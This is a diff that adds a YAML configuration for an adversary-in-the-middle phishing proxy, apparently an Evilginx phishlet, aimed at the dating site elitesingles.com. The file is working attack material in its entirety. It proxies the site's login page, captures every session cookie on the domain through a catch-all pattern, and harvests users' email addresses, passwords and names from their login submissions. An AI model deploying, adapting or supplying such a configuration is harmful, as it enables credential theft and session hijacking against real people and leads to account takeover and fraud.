@@ -1,0 +1,24 @@
+author: '@white_fi'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: 'www', domain: 'elitesingles.com', session: true, is_landing: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.elitesingles.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'name'
+      search: '(.*)'
+      type: 'post'	
+login:
+  domain: 'www.elitesingles.com'
+  path: '/'
